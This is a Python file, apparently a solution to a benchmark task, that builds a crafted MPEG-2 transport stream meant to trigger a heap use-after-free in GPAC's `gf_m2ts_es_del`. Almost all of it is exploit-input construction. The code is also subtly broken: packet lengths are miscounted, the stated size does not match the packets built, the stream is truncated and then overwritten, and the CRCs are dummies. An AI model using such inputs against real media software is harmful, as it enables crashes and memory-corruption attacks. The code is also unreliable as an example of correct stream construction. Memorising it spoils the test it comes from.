import os
import tarfile
import tempfile
import subprocess
import struct
import random
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall(path='./extracted_source')
        
        # Look for GPAC source structure
        base_dirs = ['./extracted_source', './extracted_source/gpac']
        for base_dir in base_dirs:
            if os.path.exists(base_dir):
                break
        
        # Build a PoC that triggers heap use-after-free in gf_m2ts_es_del
        # Based on typical GPAC/MPEG2-TS structure
        poc = bytearray()
        
        # MPEG2-TS packet structure: 4-byte header + 184 bytes payload
        def create_ts_packet(pid, continuity_counter, payload_start=False, adaptation_field=False):
            sync_byte = 0x47
            tei = 0  # Transport Error Indicator
            pusi = 1 if payload_start else 0  # Payload Unit Start Indicator
            tp = 0  # Transport Priority
            
            # Create header
            header = (sync_byte << 24) | (tei << 23) | (pusi << 22) | (tp << 21) | (pid << 8)
            
            if adaptation_field:
                header |= 0x20  # Adaptation field control = 10 (adaptation only)
                return struct.pack('>I', header) + bytes([0x00])  # No adaptation field content
            
            header |= 0x10  # Adaptation field control = 01 (payload only)
            header |= (continuity_counter & 0x0F)
            return struct.pack('>I', header)
        
        # Create PAT (Program Association Table)
        pat_pid = 0x0000
        pat_cc = 0
        
        # PAT packet with PMT PID 0x100
        pat_header = create_ts_packet(pat_pid, pat_cc, payload_start=True)
        pat_payload = bytes([
            0x00,  # Pointer field
            0x00,  # Table ID (PAT)
            0xB0, 0x0D,  # Section length (13 bytes)
            0x00, 0x01,  # Transport stream ID
            0xC1,  # Version/current next indicator
            0x00,  # Section number
            0x00,  # Last section number
            0x00, 0x01,  # Program number 1
            0xE1, 0x00,  # PMT PID 0x100
            0x00, 0x00, 0x00, 0x00  # CRC (dummy)
        ])
        poc.extend(pat_header + pat_payload.ljust(184, b'\xFF'))
        
        # Create PMT (Program Map Table)
        pmt_pid = 0x0100
        pmt_cc = 0
        video_pid = 0x0101
        
        # First PMT with video stream
        pmt_header = create_ts_packet(pmt_pid, pmt_cc, payload_start=True)
        pmt_payload = bytes([
            0x00,  # Pointer field
            0x02,  # Table ID (PMT)
            0xB0, 0x17,  # Section length (23 bytes)
            0x00, 0x01,  # Program number
            0xC1,  # Version/current next indicator
            0x00,  # Section number
            0x00,  # Last section number
            0xE0, 0x00,  # PCR PID (none)
            0xF0, 0x00,  # Program info length (0)
            0x1B,  # Stream type (H.264 video)
            0xE1, 0x01,  # Elementary PID 0x101
            0xF0, 0x00,  # ES info length (0)
            0x00, 0x00, 0x00, 0x00  # CRC (dummy)
        ])
        poc.extend(pmt_header + pmt_payload.ljust(184, b'\xFF'))
        
        # Create PES packets for video stream to allocate ES structure
        video_cc = 0
        
        # PES packet with stream_id 0xE0 (video)
        for i in range(3):
            ts_header = create_ts_packet(video_pid, video_cc, payload_start=(i == 0))
            video_cc = (video_cc + 1) & 0x0F
            
            if i == 0:
                pes_header = bytes([
                    0x00, 0x00, 0x01, 0xE0,  # PES start code + stream_id
                    0x00, 0x00,  # PES packet length (0 = unbounded)
                    0x80, 0xC0, 0x07,  # PES flags
                    0x00, 0x00, 0x01, 0x00,  # DTS (dummy)
                ])
                payload = b'Video data' + b'\x00' * 164
                poc.extend(ts_header + pes_header + payload)
            else:
                payload = b'Video continuation' + b'\x00' * 166
                poc.extend(ts_header + payload)
        
        # Now send a new PMT that removes the video stream (should trigger gf_m2ts_es_del)
        pmt_cc = (pmt_cc + 1) & 0x0F
        pmt_header = create_ts_packet(pmt_pid, pmt_cc, payload_start=True)
        
        # PMT with no streams (program info only)
        pmt_payload = bytes([
            0x00,  # Pointer field
            0x02,  # Table ID (PMT)
            0xB0, 0x0D,  # Section length (13 bytes)
            0x00, 0x01,  # Program number
            0xC2,  # Version = 1, current_next = 0 (inactive)
            0x00,  # Section number
            0x00,  # Last section number
            0xE0, 0x00,  # PCR PID (none)
            0xF0, 0x00,  # Program info length (0)
            0x00, 0x00, 0x00, 0x00  # CRC (dummy)
        ])
        poc.extend(pmt_header + pmt_payload.ljust(184, b'\xFF'))
        
        # Send adaptation-only packets to force buffer flushes
        for i in range(2):
            poc.extend(create_ts_packet(video_pid, video_cc, adaptation_field=True) + b'\xFF' * 183)
            video_cc = (video_cc + 1) & 0x0F
        
        # Send a packet that might trigger use-after-free
        # Create a packet with the same PID but different content type
        ts_header = create_ts_packet(video_pid, video_cc, payload_start=True)
        video_cc = (video_cc + 1) & 0x0F
        
        # Create a PES packet that looks like audio (stream_id 0xC0)
        pes_header = bytes([
            0x00, 0x00, 0x01, 0xC0,  # PES start code + audio stream_id
            0x00, 0x00,  # PES packet length
            0x80, 0x80, 0x05,  # PES flags
            0x00, 0x00, 0x01, 0x00,  # PTS (dummy)
        ])
        
        # Fill with data that might trigger the bug
        payload = b'A' * 176
        poc.extend(ts_header + pes_header + payload)
        
        # Add more packets to ensure we hit the vulnerable code path
        for i in range(3):
            ts_header = create_ts_packet(video_pid, video_cc, payload_start=False)
            video_cc = (video_cc + 1) & 0x0F
            payload = b'B' * 184
            poc.extend(ts_header + payload)
        
        # Ensure exact length of 1128 bytes (6 packets of 188 bytes)
        target_length = 1128
        current_length = len(poc)
        
        if current_length < target_length:
            # Add padding packets
            while len(poc) < target_length:
                pid = random.choice([0x1FFF, 0x0FFF])  # Null or private PIDs
                ts_header = create_ts_packet(pid, 0)
                poc.extend(ts_header + b'\xFF' * 184)
        
        # Trim to exact target length
        poc = poc[:target_length]
        
        # Add a final PAT to ensure table updates
        if len(poc) >= 188:
            pat_cc = (pat_cc + 1) & 0x0F
            pat_header = create_ts_packet(pat_pid, pat_cc, payload_start=True)
            pat_payload = bytes([
                0x00, 0x00, 0xB0, 0x0D,
                0x00, 0x01, 0xC1, 0x00,
                0x00, 0x00, 0x01, 0xE1,
                0x00, 0x00, 0x00, 0x00
            ])
            # Replace last packet with new PAT
            poc[-188:-184] = pat_header
            poc[-184:] = pat_payload.ljust(184, b'\xFF')
        
        return bytes(poc)